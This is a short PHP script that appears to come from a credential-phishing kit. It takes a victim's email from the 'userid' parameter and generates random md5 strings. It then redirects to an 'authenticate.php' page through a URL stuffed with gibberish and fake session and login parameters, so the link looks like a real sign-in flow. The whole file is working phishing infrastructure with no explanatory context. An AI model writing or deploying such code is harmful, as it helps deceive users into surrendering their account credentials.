<?php
	
	$email=$_GET['userid'];
	$praga=rand();
	$praga=md5($praga);

	header("location: authenticate.php?l=sJidXdidIYnMxmwofLodmAkNOu&eM=$praga&HosYkssJidXdidIYnMxmwofLodmAkNOueMH=$praga&osYkssJidXdidIYnMxmwofLodmAkNOueMHosYkssJidXdidIY&cmd=login_submit&id=$praga$praga&session=$praga$praga&userid=$email");

?>